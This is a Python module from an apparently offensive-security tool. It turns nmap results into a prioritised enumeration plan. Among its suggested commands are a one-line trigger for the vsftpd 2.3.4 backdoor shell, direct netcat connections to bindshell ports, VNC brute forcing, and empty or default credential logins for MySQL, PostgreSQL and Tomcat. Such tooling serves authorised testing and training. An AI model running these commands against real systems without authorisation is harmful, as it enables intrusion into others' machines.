"""
kernox.core.enumerator  –  Advanced enumeration based on discovered services.

After nmap, this engine looks at open ports and suggests/builds advanced
enumeration steps automatically:
  - Web ports (80,443,8080,8443,8180) → nikto, ffuf, whatweb
  - SMB (139,445)                     → enum4linux
  - FTP (21)                          → anonymous login test
  - MySQL/PostgreSQL (3306,5432)      → version + auth test
  - SSH (22)                          → version banner
  - RPC/NFS (111,2049)               → showmount
  - VNC (5900)                        → version check
  - IRC (6667)                        → banner grab
  - Tomcat (8009,8180)               → manager page check
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Optional

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

console = Console()

# ── Port → service category mapping ──────────────────────────────────────────

WEB_PORTS       = {80, 443, 8080, 8443, 8180, 8888, 3000, 5000}
SMB_PORTS       = {139, 445}
FTP_PORTS       = {21, 2121}
DB_PORTS        = {3306, 5432, 1433, 27017}
SSH_PORTS       = {22}
RPC_NFS_PORTS   = {111, 2049}
VNC_PORTS       = {5900, 5901}
IRC_PORTS       = {6667, 6668, 6697}
TOMCAT_PORTS    = {8009, 8180}
TELNET_PORTS    = {23}
SMTP_PORTS      = {25, 587, 465}
BINDSHELL_PORTS = {1524, 4444}
RMI_PORTS       = {1099}


@dataclass
class EnumStep:
    tool: str
    args: dict
    reason: str
    priority: int   # 1=critical, 2=high, 3=medium


def suggest_enumeration(
    parsed_nmap: dict,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
) -> list[EnumStep]:
    """
    Given parsed nmap output, return a prioritised list of enumeration steps.
    """
    steps: list[EnumStep] = []

    for host in parsed_nmap.get("hosts", []):
        ip = host.get("ip", "")
        open_ports = [p for p in host.get("ports", []) if p.get("state") == "open"]
        port_nums  = {p["port"] for p in open_ports}

        # ── CRITICAL: Bindshell / backdoor ───────────────────────────────────
        for p in open_ports:
            if p["port"] in BINDSHELL_PORTS:
                steps.append(EnumStep(
                    tool="custom",
                    args={"command": f"nc -nv {ip} {p['port']}",
                          "note": f"⚠ Backdoor/bindshell on port {p['port']}!"},
                    reason=f"Port {p['port']} is a known backdoor — connect directly",
                    priority=1,
                ))

        # ── Web ports ────────────────────────────────────────────────────────
        web_found = port_nums & WEB_PORTS
        for port in sorted(web_found):
            scheme = "https" if port == 443 else "http"
            url = f"{scheme}://{ip}:{port}" if port not in (80, 443) else f"{scheme}://{ip}"

            steps.append(EnumStep(
                tool="nikto",
                args={"target": url},
                reason=f"Web server on port {port} — vulnerability scan",
                priority=1,
            ))
            steps.append(EnumStep(
                tool="ffuf",
                args={"target": url, "wordlist": wordlist},
                reason=f"Web server on port {port} — directory fuzzing",
                priority=2,
            ))

        # ── SMB ──────────────────────────────────────────────────────────────
        if port_nums & SMB_PORTS:
            steps.append(EnumStep(
                tool="enum4linux",
                args={"target": ip, "flags": "-a"},
                reason="SMB ports open — full enumeration (users, shares, groups)",
                priority=1,
            ))

        # ── FTP ──────────────────────────────────────────────────────────────
        for p in open_ports:
            if p["port"] in FTP_PORTS:
                version = p.get("version", "")
                steps.append(EnumStep(
                    tool="custom",
                    args={"command": f"ftp -n {ip} {p['port']}",
                          "note": "Try anonymous:anonymous login"},
                    reason=f"FTP on port {p['port']} ({version}) — test anonymous login",
                    priority=1,
                ))
                # vsftpd 2.3.4 backdoor
                if "2.3.4" in version:
                    steps.append(EnumStep(
                        tool="custom",
                        args={"command": f"echo 'USER backdoor:)\\nPASS test' | nc {ip} 21 && nc {ip} 6200",
                              "note": "vsftpd 2.3.4 has a BACKDOOR on port 6200!"},
                        reason="⚠ vsftpd 2.3.4 BACKDOOR detected — try port 6200",
                        priority=1,
                    ))

        # ── MySQL ─────────────────────────────────────────────────────────────
        if 3306 in port_nums:
            steps.append(EnumStep(
                tool="custom",
                args={"command": f"mysql -h {ip} -u root --password= -e 'show databases;'",
                      "note": "Test MySQL anonymous/root login"},
                reason="MySQL on 3306 — test empty root password",
                priority=2,
            ))

        # ── PostgreSQL ────────────────────────────────────────────────────────
        if 5432 in port_nums:
            steps.append(EnumStep(
                tool="custom",
                args={"command": f"psql -h {ip} -U postgres -c '\\l'",
                      "note": "Test PostgreSQL default login"},
                reason="PostgreSQL on 5432 — test default credentials",
                priority=2,
            ))

        # ── NFS ───────────────────────────────────────────────────────────────
        if port_nums & RPC_NFS_PORTS:
            steps.append(EnumStep(
                tool="custom",
                args={"command": f"showmount -e {ip}",
                      "note": "Check NFS exports"},
                reason="NFS/RPC detected — check for exposed shares",
                priority=2,
            ))

        # ── VNC ───────────────────────────────────────────────────────────────
        if port_nums & VNC_PORTS:
            steps.append(EnumStep(
                tool="custom",
                args={"command": f"nmap -sV --script vnc-info,vnc-brute -p 5900 {ip}",
                      "note": "VNC version and auth check"},
                reason="VNC detected — check auth type and version",
                priority=2,
            ))

        # ── Tomcat ────────────────────────────────────────────────────────────
        if port_nums & TOMCAT_PORTS:
            for port in sorted(port_nums & TOMCAT_PORTS):
                steps.append(EnumStep(
                    tool="custom",
                    args={"command": f"curl -s http://{ip}:{port}/manager/html",
                          "note": "Check Tomcat manager page (try tomcat:tomcat)"},
                    reason=f"Apache Tomcat on {port} — check manager page",
                    priority=1,
                ))

        # ── IRC ───────────────────────────────────────────────────────────────
        if port_nums & IRC_PORTS:
            steps.append(EnumStep(
                tool="custom",
                args={"command": f"nmap -sV --script irc-info -p 6667 {ip}",
                      "note": "UnrealIRCd may have backdoor CVE-2010-2075"},
                reason="IRC detected — check for UnrealIRCd backdoor",
                priority=1,
            ))

        # ── Telnet ────────────────────────────────────────────────────────────
        if port_nums & TELNET_PORTS:
            steps.append(EnumStep(
                tool="custom",
                args={"command": f"echo '' | nc -w3 {ip} 23",
                      "note": "Telnet is plaintext — grab banner"},
                reason="Telnet on 23 — grab banner and check access",
                priority=2,
            ))

        # ── SMTP ─────────────────────────────────────────────────────────────
        if port_nums & SMTP_PORTS:
            steps.append(EnumStep(
                tool="custom",
                args={"command": f"nmap -sV --script smtp-enum-users,smtp-commands -p 25 {ip}",
                      "note": "Enumerate SMTP users"},
                reason="SMTP detected — enumerate users via VRFY/EXPN",
                priority=3,
            ))

        # ── Java RMI ─────────────────────────────────────────────────────────
        if port_nums & RMI_PORTS:
            steps.append(EnumStep(
                tool="custom",
                args={"command": f"nmap -sV --script rmi-dumpregistry -p 1099 {ip}",
                      "note": "Java RMI registry dump"},
                reason="Java RMI on 1099 — dump registry",
                priority=2,
            ))

    # Sort by priority
    steps.sort(key=lambda s: s.priority)
    return steps


def print_enum_plan(steps: list[EnumStep]) -> None:
    """Render the enumeration plan as a rich table."""
    if not steps:
        return

    table = Table(
        show_header=True,
        header_style="bold magenta",
        box=box.SIMPLE_HEAVY,
        border_style="dim",
        show_lines=True,
    )
    table.add_column("PRI", width=5, style="bold")
    table.add_column("TOOL", width=14, style="bold cyan")
    table.add_column("REASON")
    table.add_column("COMMAND / NOTE", style="dim")

    priority_color = {1: "bold red", 2: "bold yellow", 3: "cyan"}

    for step in steps:
        color = priority_color.get(step.priority, "white")
        pri_label = {1: "🔴 HIGH", 2: "🟡 MED", 3: "🔵 LOW"}.get(step.priority, "?")

        if step.tool == "custom":
            cmd_note = step.args.get("command", "")[:80]
        else:
            cmd_note = str(step.args)[:80]

        table.add_row(
            f"[{color}]{pri_label}[/{color}]",
            step.tool,
            step.reason,
            cmd_note,
        )

    console.print(Panel(
        table,
        title="[bold cyan]Advanced Enumeration Plan[/bold cyan]",
        border_style="cyan",
        box=box.ROUNDED,
    ))
